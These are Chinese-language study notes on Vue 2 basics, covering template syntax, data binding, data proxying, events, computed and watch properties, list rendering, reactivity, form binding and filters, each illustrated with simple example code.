---
title: Vue框架
date: 2022-05-21
---

# Vue

> 2021.7.17 - 2021.8.2

## 一、Vue基础

### 1-1 Vue简介

#### 1. 官网

> 英文：https://vuejs.org/
>
> 中文：https://cn.vuejs.org/

#### 2. Vue是什么？

> 一套用于`构建用户界面`的`渐进式`JavaScript框架
>
> 渐进式：Vue可以自底向上逐层的应用：
>
> - 简单应用：只需一个轻量小巧的核心库
> - 复杂应用：可以引入各式各样的Vue插件

#### 3. 谁开发的？

> 尤雨溪
>
> 后起之秀，生态完善，已然成为国内前端工程师必备技能、

#### 4. Vue的特点

> 1. 采用`组件化`模式，提高代码复用率、且让代码更好维护
> 2. `声明式`编码，让编码人员无需直接操作DOM，提高开发效率（JS是命令式编码，一步一步指令）
> 3. 使用`虚拟DOM`+优秀的`Diff算法`，尽量复用DOM节点

#### 5. 学习Vue之前要掌握的JavaScript基础知识

> ES6语法规范
>
> ES6模块化
>
> 包管理器（npm、cpm...）
>
> 原型、原型链
>
> 数组常用方法
>
> axios
>
> promise
>
> ...

### 1-2 官网导航

#### 1. 学习

> 1. 教程！！！
> 2. API（Vue字典）！！！
> 3. 风格指南：如何写出优雅的代码
> 4. 示例：把示例左边框往右边拉就能看到代码
> 5. Cookbook：技巧
> 6. 视频教程

#### 2. 生态系统

> 1. 帮助
>
> 2. 工具！！！
>
> 3. 核心插件！！！
>
> 4. 信息

#### 3. 团队

> 1. 合作伙伴
>
> 2. 主题
>
> 3. Awesome Vue（官方推荐的第三方库）！！！
>
> 4. 浏览和Vue相关的包

#### 4. 其他...

### 1-3 初始Vue

#### 1. 安装

1. 直接用<script>引入（vue.js/vue.min.js），引入后就多了个Vue构造函数，这时开发者工具上会有两个提示：

   - 提示安装devtools开发者调试工具以便更好的调试，点击跳转到GitHub，要在Chrome上安装，所以点击Installation里的`Get the Chrome Extension`，然后将下载的包添加到浏览器的扩展中即可

   - 提示发布时使用生产版本（vue.min.js），可以在官网API中看到Vue.config这个对象，是全局配置，里面的productionTip改为false就可以阻止vue在启动时生成生产提示

     ```JavaScript
     Vue.config.productionTip = false
     ```

2. NPM安装，同时配合命令行工具（CLI）

#### 2. 简单样例

```HTML
<!-- 准备好一个容器 -->
<div id="demo">
	<h1>Hello，{{name.toUpperCase()}}，{{address}}</h1>
</div>
<script type="text/javascript" >
	Vue.config.productionTip = false 
	//创建Vue实例
	new Vue({
		el:'#demo', //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。(也可以是document.getElementById('#demo'))
		data:{ //data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。
			name:'atguigu',
			address:'北京'
		}
	})
</script>
```

#### 3. 相关问题

1. 想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象；
2. 容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法；
3. 容器里的代码被称为【Vue模板】；
4. Vue实例和容器是一一对应的；
5. 真实开发中只有一个Vue实例，并且会配合着组件一起使用；
6. {{xxx}}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性；
7. 一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新；

```
注意区分：js表达式 和 js代码(语句)
1.表达式(即特殊的js语句)：一个表达式会产生一个值，可以放在任何一个需要值的地方：				
	(1). a							
	(2). a+b						
	(3). demo(1)					
	(4). x === y ? 'a' : 'b'
2.js代码(语句)
	(1). if(){}
	(2). for(){}
```

### 1-4 模板语法

#### 1. 插值语法

1. 功能：用于解析标签体内容。

2. 写法：{{ xxx }}，xxx是js表达式，且可以直接读取到data中的所有属性

#### 2. 指令语法

1. 功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）
2. 写法：v-????
3. 举例：v-bind:href="xxx" 或 简写为 :href="xxx"，xxx同样要写js表达式，且可以直接读取到data中的所有属性。

### 1-5 数据绑定

#### 1. 单向数据绑定(v-bind)：

1. 数据只能从data流向页面。

  #### 2.双向绑定(v-model)：

1. 数据不仅能从data流向页面，还可以从页面流向data。
2. v-model只能应用在表单类元素（输入类元素 如：input、select等）上 ，因为它作用于value
3. v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。

### 1-6 el与data的两种写法

#### 1. el

1. new Vue时候配置el属性，el:'#root'
2. 先创建Vue实例，随后再通过vm.$mount('#root')指定el的值(mount：挂载)

#### 2. data

1. 对象式

   ```js
   data:{
   	name:'尚硅谷'
   }
   ```

2. 函数式（必须有return{}）

   ```js
   data(){
   	console.log('@@@',this) //此处的this是Vue实例对象
   	return{
   		name:'尚硅谷'
   	}
   }
   ```

3.  如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。

4. 一个重要的原则：

   ```
   由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了，箭头函数没有自己的this，往外找，就找到了全局的window
   ```

### 1-7 MVVM模型

#### 1. MVVM模型

1. M：模型（Model）：对应data中的数据

2. V：视图（View）：模板

3. VM：视图模型（ViewModel）：Vue实例对象（因此在文档中经常会使用 `vm` (ViewModel 的缩写) 这个变量名表示 Vue 实例）

<img src="笔记/images/MVVM模型.png" alt="MVVM模型"  />

<img src="笔记/images/MVVM.png" alt="MVVM" style="zoom: 67%;" />

#### 3. 观察发现

1. data中所有的属性，最后都出现在了vm身上。
2. vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。

### 1-8 数据代理

#### 1. Object.defineproperty方法

1. [`Object.defineProperty()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty) 方法会直接在一个对象上定义一个新属性，或者修改一个对象的现有属性，并返回此对象，新增的属性默认是不参与枚举（遍历）的。

2. 语法：

   ```
   Object.defineProperty(obj, prop, descriptor)
   - obj: 要定义属性的对象
   - prop: 要定义或修改的属性的名称或 Symbol 。
   - descriptor: 要定义或修改的属性描述符。
   ```

3. 描述符：
   - `enumerable` 定义了对象的属性是否可以在 [`for...in`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/for...in) 循环和 [`Object.keys()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/keys) 中被枚举，默认为false
   - `value` 该属性对应的值。可以是任何有效的 JavaScript 值（数值，对象，函数等），默认为 [`undefined`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/undefined)。
   - `writable` 控制属性是否可以被修改，也就是上面的 `value`，能否被[`赋值运算符`](https://developer.mozilla.org/zh-CN/docs/conflicting/Web/JavaScript/Reference/Operators_8d54701de06af40a7c984517cbe87b3e)改变，默认为 `false`。
   - `configurable` 当且仅当该属性的 `configurable` 键值为 `true` 时，该属性的描述符才能够被改变，同时该属性也能从对应的对象上被删除，默认为 `false`。
   - `get` 属性的 getter 函数。当访问该属性时，会调用此函数。执行时不传入任何参数，但是会传入 `this` 对象（由于继承关系，这里的`this`并不一定是定义该属性的对象）。该函数的返回值会被用作属性的值，默认为 `undefined`。
   - `set` 属性的 setter 函数。当属性值被修改时，会调用此函数。该方法接受一个参数（也就是被赋予的新值），会传入赋值时的 `this` 对象，默认为 `undefined`。

```js
let number = 18
let person = {
	name:'张三',
	sex:'男',
}
Object.defineProperty(person,'age',{
	// value:18,
	// enumerable:true, //控制属性是否可以枚举，默认值是false
	// writable:true, //控制属性是否可以被修改，默认值是false
	// configurable:true //控制属性是否可以被删除，默认值是false

	//当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
    /* 
     * 在控制台中，将鼠标放在该属性值(即省略号)上时会出现提示：Invoke property getter(调用属性的getter)
     * age: (...) 点击这个省略号就会调用get()读取属性
     */
	get(){
		console.log('有人读取age属性了')
		return number
	},
	//当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
	set(value){
		console.log('有人修改了age属性，且值是',value)
		number = value
	}
})
```

#### 2. 定义

- 数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）

```js
let obj = {x:100}
let obj2 = {y:200}
//本例实现了通过obj2对obj的数据代理
Object.defineProperty(obj2,'x',{
	get(){
		return obj.x
	},
	set(value){
		obj.x = value
	}
})
```

#### 3. Vue中的数据代理

1. Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读/写）

2. Vue中数据代理的好处：更加方便的操作data中的数据

3. 基本原理：

   - 通过Object.defineProperty()把data对象中所有属性添加到vm上。

   - 为每一个添加到vm上的属性，都指定一个getter/setter。

   - 在getter/setter内部去操作（读/写）data中对应的属性。

![数据代理](.\images\数据代理.png)

### 1-9 事件处理

#### 1. 事件的基本使用

1. 使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；
2. 事件的回调需要配置在methods对象中，最终会在vm上（如果写在data上则会做一个数据代理，而这是没必要的)；
3. methods中配置的函数，不要用箭头函数！否则this就不是vm了；
4. methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；
5. @click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参；

```HTML
<div id="root">
	<h2>欢迎来到{{name}}学习</h2>
	<button @click="showInfo1">点我提示信息1（不传参）</button>
	<button @click="showInfo2($event,66)">点我提示信息2（传参）</button>
</div>
```

```js
methods:{
	showInfo1(event){
        // console.log(event.target.innerText)
        // console.log(this) //此处的this是vm
        alert('同学你好！')
	},
	showInfo2(event,number){
		console.log(event,number)
		// console.log(event.target.innerText)
		// console.log(this) //此处的this是vm
		alert('同学你好！！')
	}
}
```

#### 2. 事件修饰符

1. prevent：阻止默认事件（常用）；<==> 相当于在回调函数中调用了`event.preventDefault()`方法
2. stop：阻止事件冒泡（常用）；<==> `event.stopPropagation()`
3. once：事件只触发一次（常用）；
4. capture：使用事件的捕获模式（即在捕获阶段就触发事件）；
5. self：只有event.target是当前操作的元素时才触发事件(在某种程度上来说也能阻止冒泡)；
6. passive：事件的默认行为立即执行，无需等待事件回调执行完毕（一般移动端会用一下）；

```html
<!-- wheel事件表示鼠标滚轮滚动事件，触发时会先执行回调函数，再执行默认行为（滚动条滚动） -->
<ul @wheel.passive="demo" class="list">
	<li>1</li>
    <li>2</li>
    <li>3</li>
    <li>4</li>
</ul>
<!-- 修饰符可以连续写，如下所示是先阻止默认行为再阻止冒泡；@click.stop.prevent是先阻止冒泡再阻止默认行为 -->
<!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
```

```js
demo() {
	for (let i = 0; i < 100000; i++) {
		console.log('#')
	}
	console.log('累坏了')
}
```

#### 3. 键盘事件

1. Vue中常用的按键别名：

   ```
   回车 => enter
   删除 => delete (捕获“删除”和“退格”键)
   退出 => esc
   空格 => space
   换行 => tab (特殊，必须配合keydown去使用，因为它按下后就会切换焦点，所以无法配合keyup使用)
   上 => up
   下 => down
   左 => left
   右 => right
   ```

2. Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名），比如CapsLock→caps-lock

3. 系统修饰键（用法特殊）：ctrl、alt、shift、meta(即Win)

   1) 配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。

   2) 配合keydown使用：正常触发事件。

4. 也可以使用keyCode去指定具体的按键（不推荐，因为未来也许keyCode会被废止）

5. Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名

```HTML
<input type="text" placeholder="按下回车提示输入" @keydown.enter="showInfo"> <!-- 按下Enter键触发 -->
<!-- 系统修饰符也可以连续写，比如要按下ctrl+y键才能触发 -->
<input type="text" placeholder="按下回车提示输入" @keydown.ctrl.y="showInfo">
```

### 1-10 计算属性与监视

#### 1. 计算属性

1. 定义

   - 计算属性：要用的属性不存在，要通过已有属性计算得来，计算属性要有一个全新的配置项computed
   - 对Vue来说，data里面的数据就是属性，只要Vue中的数据改变，就会重新解析模板，遇到插值语法里的方法会重新调用

2. 原理

   - 底层借助了`Objcet.defineproperty`方法提供的getter和setter。

3. get函数什么时候执行？

   - 初次读取时会执行一次。

   - 当`依赖的数据`发生改变时会被再次调用。

4. 优势

   - 与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。

5. 备注

   - 计算属性最终会出现在vm上，直接读取使用即可。

   - 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。

```js
const vm = new Vue({
    ...
    computed:{
        fullName:{
            //get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
            //get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
            get(){
                console.log('get被调用了')
                // console.log(this) //此处的this是vm
                return this.firstName + '-' + this.lastName
            },
            //set什么时候调用? 当fullName被修改时。
            set(value){
                console.log('set',value)
                const arr = value.split('-')
                this.firstName = arr[0]
                this.lastName = arr[1]
            }
        }
    }
})    
```

```js
//简写(只读不写时才能简写，该函数就当getter用)
fullName(){
	console.log('get被调用了')
	return this.firstName + '-' + this.lastName
}
```

#### 2. 监视（侦听）属性

```HTML
<!-- 绑定事件的时候：@xxx="yyy" yyy可以写一些简单的语句 -->
<button @click="isHot = !isHot">切换天气</button>
```

1. 监视属性watch：

   - 当被监视的属性变化时, 回调函数自动调用, 进行相关操作
   - 监视的属性必须存在，才能进行监视！！
   - 监视的两种写法：

   ```js
   // 1. new Vue时传入watch配置
   const vm = new Vue({
       ...
       watch:{
           isHot:{
               immediate:true, //初始化时让handler调用一下
               //handler什么时候调用？当isHot发生改变时。
               handler(newValue,oldValue){
                   console.log('isHot被修改了',newValue,oldValue)
               }
           }
       }
   })
   // 2. 通过vm.$watch监视
   vm.$watch('isHot',{
   	immediate:true, //初始化时让handler调用一下，默认是false
   	//handler什么时候调用？当isHot发生改变时。
   	handler(newValue,oldValue){ // 有两个参数，一个是新值，一个是旧值
   		console.log('isHot被修改了',newValue,oldValue)
   	}
   })
   ```

2. 深度监视

   - 深度监视：

     1）Vue中的watch默认不监测对象内部值的改变（一层）。

     2）配置deep:true可以监测对象内部值改变（多层）。

   - 备注：

     1）Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！

     2）使用watch时根据数据的具体结构，决定是否采用深度监视。

   ```js
   data:{
   	isHot:true,
   	numbers:{
   		a:1,
   		b:1
   	}
   },
   watch:{
   	// 监视多级结构中某个属性的变化（原始写法是要加引号的，简写可以不加，但这种情况要加，否则报错）
   	/* 'numbers.a':{
   		handler(){
   			console.log('a被改变了')
   		}
   	} */
   	//监视多级结构中所有属性的变化
   	numbers:{
   		deep:true, // 如果不开启这个，那监测的就是numbers的地址是否有变化
   		handler(){
   			console.log('numbers改变了')
   		}
   	}
   }
   ```

3. 监视属性-简写

   当监视属性中只有handler()而不需要开启其他配置项时才能简写

   ```js
   watch:{
   	isHot(newValue,oldValue){
   		console.log('isHot被修改了',newValue,oldValue,this)
   	}
   }
   
   /* vm.$watch('isHot',function (newValue,oldValue) {
   	console.log('isHot被修改了',newValue,oldValue,this)
   }) */
   ```

#### 3. 区别和原则

1. computed和watch之间的区别
   - computed能完成的功能，watch都可以完成。
   - watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。
2. 两个重要的小原则
   - 所有被Vue管理的函数，最好写成普通函数，这样`this的指向才是vm 或 组件实例对象`。
   - 所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样`this的指向才是vm 或 组件实例对象`。

```js
watch:{
	firstName(val){
		setTimeout(()=>{
			console.log(this) //vue实例对象，若用普通函数则返回Window
			this.fullName = val + '-' + this.lastName
		},1000);
	},
	lastName(val){
		this.fullName = this.firstName + '-' + val
	}
}
```

### 1-11 绑定样式

#### 1. 绑定class样式

- 写法:class="xxx" xxx可以是字符串、对象、数组。

```html
<!-- 字符串写法，适用于：样式的类名不确定，需要动态指定 -->
<div class="basic" :class="mood" @click="changeMood">{{name}}</div>

<!-- 数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
<div class="basic" :class="classArr">{{name}}</div>

<!-- 对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
<div class="basic" :class="classObj">{{name}}</div>
```

```js
data:{
	name:'尚硅谷',
	mood:'normal',
	classArr:['atguigu1','atguigu2','atguigu3'], // 可以通过数组的相关方法来移除或添加
	classObj:{ // true就是应用，false就是不应用
		atguigu1:false,
		atguigu2:false,
	}
},
methods: {
	changeMood(){
		const arr = ['happy','sad','normal']
		const index = Math.floor(Math.random()*3) // 随机生成[0, 2]的数据
		this.mood = arr[index]
	}
},
  
/*  vm.classArr.shift(); // 删除第一个
vm.classArr.push('atguigu1'); */
```

#### 2. 绑定style样式

- :style="{fontSize: xxx}"其中xxx是动态值，属性名用驼峰命名法，或者加引号 → {'font-size': xxx}
  :style="[a,b]"其中a、b是样式对象。

```html
<!-- 对象写法 -->
<div class="basic" :style="styleObj">{{name}}</div>

<!-- 数组写法，比较少用 -->
<div class="basic" :style="[styleObj, styleObj2]">{{name}}</div>
<div class="basic" :style="styleArr">{{name}}</div>
```

```js
data: {
    styleObj: {
        fontSize: '40px',
        color: 'red',
    },
    styleObj2: {
        backgroundColor: 'orange'
    },
    styleArr: [{
        fontSize: '40px',
        color: 'blue',
    }, {
        backgroundColor: 'gray'
    }]
},
```

### 1-12 条件渲染

#### 1. v-show

- 写法：v-show="表达式"
- 适用于：切换频率较`高`的场景
- 特点：不展示的DOM元素`未被移除`，仅仅是使用样式diaplay:none隐藏掉

```html
<!-- <h2 v-show="false">欢迎来到{{name}}</h2> -->
<h2 v-show="1 === 1">欢迎来到{{name}}</h2>
```

#### 2. v-if

- 写法：

  1）v-if="表达式" 

  2）v-else-if="表达式"

  3）v-else="表达式"

- 适用于：切换频率较`低`的场景

- 特点：不展示的DOM元素`直接被移除

- 注意：v-if可以和 v-else-if、v-else 一起使用，但要求结构不能被“打断”。

```html
<div v-if="n === 1">Angular</div>
<div v-else-if="n === 2">React</div>
<!-- <div></div> --> <!-- 这个盒子是不允许出现在这里的，会打断v-xxx的条件分支 -->
<div v-else-if="n === 3">Vue</div>
<div v-else>哈哈</div>

<!-- v-if与template的配合使用，template不会在DOM中显示 | 注意：template不能与v-show配合使用 -->
<template v-if="n === 1">
	<h2>你好</h2>
	<h2>尚硅谷</h2>
	<h2>北京</h2>
</template>
```

#### 3. 备注

- 使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。因为用v-if时，若值为false，则元素直接被移除，此时无法获取到元素

### 1-13 列表渲染

#### 1. 基本列表

- v-for指令:

  1. 用于展示列表数据

  2. 语法：

     - v-for="item in items" :key="yyy"
     - v-for="(item, index) in items" :key="yyy"

  3. 可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）

     除了对象中k是属性名，遍历其他类型时样例中的index都是从0起算

```html
<!-- 准备好一个容器-->
<div id="root">
	<!-- 遍历数组 -->
	<ul>
		<li v-for="(p,index) of persons" :key="index"> <!-- 这里的key也可以是p.id -->
			{{p.name}}-{{p.age}}
		</li>
	</ul>
	<!-- 遍历对象 -->
	<ul>
		<li v-for="(value,k) of car" :key="k"> <!-- k-属性名|value-属性值 -->
			{{k}}-{{value}}
		</li>
	</ul>
	<!-- 遍历字符串（用得少） -->
	<ul>
		<li v-for="(char,index) of str" :key="index"> <!-- char表示str的每个字符 -->
			{{char}}-{{index}}
		</li>
	</ul>
	
	<!-- 遍历指定次数（用得少） -->
	<ul>
		<li v-for="(number,index) of 5" :key="index"> <!-- number∈[1, 5] -->
			{{index}}-{{number}}
		</li>
	</ul>
</div>
```

```js
data:{
	persons:[
		{id:'001',name:'张三',age:18},
		{id:'002',name:'李四',age:19},
		{id:'003',name:'王五',age:20}
	],
	car:{
		name:'奥迪A8',
		price:'70万',
		color:'黑色'
	},
	str:'hello'
}
```

#### 2. key的原理

1. 从后台请求过来的数据一定会有一个唯一标识，这样数据库中才能对数据进行增删改查操作，也就是键值

2. 面试题：react、vue中的key有什么作用？（key的内部原理）

![遍历列表时key的作用（index作为key）](.\images\遍历列表时key的作用（index作为key）.png)

	1. 虚拟DOM中key的作用：
		key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 
		随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
	2.对比规则：
		(1).旧虚拟DOM中找到了与新虚拟DOM相同的key：
			①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
			②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
		(2).旧虚拟DOM中未找到与新虚拟DOM相同的key
			创建新的真实DOM，随后渲染到到页面。
	3. 用index作为key可能会引发的问题：
		1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:
			会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
		2. 如果结构中还包含输入类的DOM：
			会产生错误DOM更新 ==> 界面有问题。
	4. 开发中如何选择key?:
		1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
		2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，
		使用index作为key是没有问题的。

![遍历列表时key的作用（id作为key）](.\images\遍历列表时key的作用（id作为key）.png)

#### 3. 列表过滤

- 用数组方法 `filter()`，该方法创建一个新数组, 其包含通过所提供函数实现的测试的所有元素

  ```
  语法：var newArray = arr.filter(callback(element[, index[, array]])[, thisArg])
  - callback：用来测试数组的每个元素的函数。返回 true 表示该元素通过测试，保留该元素，false 则不保留
  	- element：数组中当前正在处理的元素。
  	- index：(可选)正在处理的元素在数组中的索引。
  	- array：(可选)调用了 filter 的数组本身。
  - thisArg：(可选)执行 callback 时，用于 this 的值。
  ```

- 模糊查询用数组方法`indexOf()`，该方法返回在数组中可以找到一个给定元素的第一个索引，若存在，则返回的索引从0起算；如果不存在，则返回-1。另外，若查询的是一个空串，也返回0

```html
<!-- 准备好一个容器-->
<div id="root">
    <h2>人员列表</h2>
    <input type="text" placeholder="请输入名字" v-model="keyWord">
    <ul>
        <li v-for="(p,index) of filPerons" :key="p.id">
            {{p.name}}-{{p.age}}-{{p.sex}}
        </li>
    </ul>
</div>
```

```js
//用watch实现
new Vue({
	el:'#root',
	data:{
		keyWord:'',
		persons:[
			{id:'001',name:'马冬梅',age:19,sex:'女'},
			{id:'002',name:'周冬雨',age:20,sex:'女'},
			{id:'003',name:'周杰伦',age:21,sex:'男'},
			{id:'004',name:'温兆伦',age:22,sex:'男'}
		],
		filPerons:[]
	},
	watch:{
		keyWord:{
			immediate:true, //初始化时让handler调用一下，此时val=''(空串)，就能把persons赋给filPersons了
			handler(val){
				this.filPerons = this.persons.filter((p)=>{ //这里用回调函数，this是vue实例
					return p.name.indexOf(val) !== -1	   //若用普通函数，this是Window
				})
			}
		}
	}
})
```

```js
//用computed实现
new Vue({
    el: '#root',
    data: {
        keyWord: '',
        persons: [{
            id: '001',
            name: '马冬梅',
            age: 19,
            sex: '女'
        }, {
            id: '002',
            name: '周冬雨',
            age: 20,
            sex: '女'
        }, {
            id: '003',
            name: '周杰伦',
            age: 21,
            sex: '男'
        }, {
            id: '004',
            name: '温兆伦',
            age: 22,
            sex: '男'
        }]
    },
    computed: {
        filPerons() {
            return this.persons.filter((p) => {
                return p.name.indexOf(this.keyWord) !== -1
            })
        }
    }
})
```

```js
//#region 
/*
...小技巧：在VScode中，只要像这样把多行注释的内容包围起来，那多行注释的内容就可折叠了
*/
//#endregion
```

#### 4. 列表排序

```html
<!-- 准备好一个容器-->
<div id="root">
	<h2>人员列表</h2>
	<input type="text" placeholder="请输入名字" v-model="keyWord">
	<button @click="sortType = 2">年龄升序</button>
	<button @click="sortType = 1">年龄降序</button>
	<button @click="sortType = 0">原顺序</button>
	<ul>
		<li v-for="(p,index) of filPerons" :key="p.id">
			{{p.name}}-{{p.age}}-{{p.sex}}
			<input type="text">
		</li>
	</ul>
</div>
```

```js
new Vue({
	el:'#root',
	data:{
		keyWord:'',
		sortType:0, //0原顺序 1降序 2升序
		persons:[
			{id:'001',name:'马冬梅',age:30,sex:'女'},
			{id:'002',name:'周冬雨',age:31,sex:'女'},
			{id:'003',name:'周杰伦',age:18,sex:'男'},
			{id:'004',name:'温兆伦',age:19,sex:'男'}
		]
	},
	computed:{
		filPerons(){ //该计算属性依赖于sortType，只要它变了就会重新计算
			const arr = this.persons.filter((p)=>{
				return p.name.indexOf(this.keyWord) !== -1
			})
			//判断一下是否需要排序
			if(this.sortType){
				arr.sort((p1,p2)=>{
					return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age
				})
			}
			return arr
		}
	}
}) 
```

#### 5. Vue监测数据改变的原理

 1. vue会监视data中所有层次的数据。

 2. 如何监测`对象`中的数据？

    通过setter实现监视(给每个属性添加数据代理)，且要在new Vue时就传入要监测的数据。
    		(1) 对象中后追加的属性，Vue默认不做响应式处理
    		(2) 如需给后添加的属性做响应式，请使用如下API：
    				`Vue.set(target，propertyName/index，value) ` 或 
    				`vm.$set(target，propertyName/index，value)`

 3. 如何监测`数组`中的数据？

    通过包裹数组`更新元素的方法`实现，本质就是做了两件事：
    		(1) 调用原生对应的方法对数组进行更新。
    		(2) 重新解析模板，进而更新页面。

 4. 在Vue修改数组中的某个元素一定要用如下方法：
    		        (1) 使用这些API: `push()、pop()、shift()、unshift()、splice()、sort()、reverse()`
                	(2) `Vue.set()` 或 `vm.$set()`

 5. 如果要使用诸如`filter()`之类不影响原数组的方法，就把通过该方法返回的数组直接替换原数组

	特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象(_data) 添加属性！！！

```html
<div id="root">
    <h1>学生信息</h1>
    <button @click="student.age++">年龄+1岁</button> <br/>
    <button @click="addSex">添加性别属性，默认值：男</button> <br/>
    <button @click="student.sex = '未知' ">修改性别</button> <br/>
    <button @click="addFriend">在列表首位添加一个朋友</button> <br/>
    <button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br/>
    <button @click="addHobby">添加一个爱好</button> <br/>
    <button @click="updateHobby">修改第一个爱好为：开车</button> <br/>
    <button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br/>
    <h3>姓名：{{student.name}}</h3>
    <h3>年龄：{{student.age}}</h3>
    <h3 v-if="student.sex">性别：{{student.sex}}</h3>
    <h3>爱好：</h3>
    <ul>
        <li v-for="(h,index) in student.hobby" :key="index">
            {{h}}
        </li>
    </ul>
    <h3>朋友们：</h3>
    <ul>
        <li v-for="(f,index) in student.friends" :key="index">
            {{f.name}}--{{f.age}}
        </li>
    </ul>
</div>
```

```js
const vm = new Vue({
    el: '#root',
    data: {
        student: {
            name: 'tom',
            age: 18,
            hobby: ['抽烟', '喝酒', '烫头'],
            friends: [{
                name: 'jerry',
                age: 35
            }, {
                name: 'tony',
                age: 36
            }]
        }
    },
    methods: {
        addSex() {
            // Vue.set(this.student,'sex','男')
            this.$set(this.student, 'sex', '男')
        },
        addFriend() {
            this.student.friends.unshift({
                name: 'jack',
                age: 70
            })
        },
        updateFirstFriendName() {
            this.student.friends[0].name = '张三' // 这里本质是修改对象的属性，有setter就能监测到变化
        },
        addHobby() {
            this.student.hobby.push('学习')
        },
        updateHobby() {
            // 不能通过索引（数组下标）直接修改
            // this.student.hobby.splice(0,1,'开车')
            // Vue.set(this.student.hobby,0,'开车')
            this.$set(this.student.hobby, 0, '开车')
        },
        removeSmoke() {
            this.student.hobby = this.student.hobby.filter((h) => {
                return h !== '抽烟'
            })
        }
    }
})
```

### 1-14 收集表单数据

若：`<input type="text"/>`，则v-model收集的是value值，用户输入的就是value值。
若：`<input type="radio"/>`，则v-model收集的是value值，且要给标签配置value值。
若：`<input type="checkbox"/>`

1. 没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
2. 配置input的value属性:
   		(1) v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
      		(2) v-model的初始值是数组，那么收集的的就是value组成的数组
   备注：v-model的三个修饰符：
   		lazy：失去焦点再收集数据
   		number：输入字符串转为有效的数字
   		trim：输入首尾空格过滤

```html
<div id="root">
	<form @submit.prevent="demo">
		账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
		密码：<input type="password" v-model="userInfo.password"> <br/><br/>
		年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
		性别：
		男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
		女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
		爱好：
		学习<input type="checkbox" v-model="userInfo.hobby" value="study">
		打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
		吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
		<br/><br/>
		所属校区
		<select v-model="userInfo.city">
			<option value="">请选择校区</option>
			<option value="beijing">北京</option>
			<option value="shanghai">上海</option>
			<option value="shenzhen">深圳</option>
			<option value="wuhan">武汉</option>
		</select>
		<br/><br/>
		其他信息：
		<textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
		<input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协
议》</a>
		<button>提交</button>
	</form>
</div>
```

```js
new Vue({
	el:'#root',
	data:{
		userInfo:{
			account:'',
			password:'',
			age:18,
			sex:'female',
			hobby:[],
			city:'beijing',
			other:'',
			agree:''
		}
	},
	methods: {
		demo(){
			console.log(JSON.stringify(this.userInfo))
		}
	}
})
```

### 1-15 过滤器

#### 1. 定义

- 对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。

#### 2. 语法
1. 注册过滤器：`Vue.filter(name,callback) --- 全局` 或 `new Vue{filters:{}} --- 局部`
2. 使用过滤器：`{{ xxx | 过滤器名}} --- 插值语法` 或  `v-bind:属性 = "xxx | 过滤器名" --- v-bind`

#### 3. 备注
1. 过滤器也可以接收额外参数、多个过滤器也可以串联
2. 并没有改变原本的数据, 是产生新的对应的数据

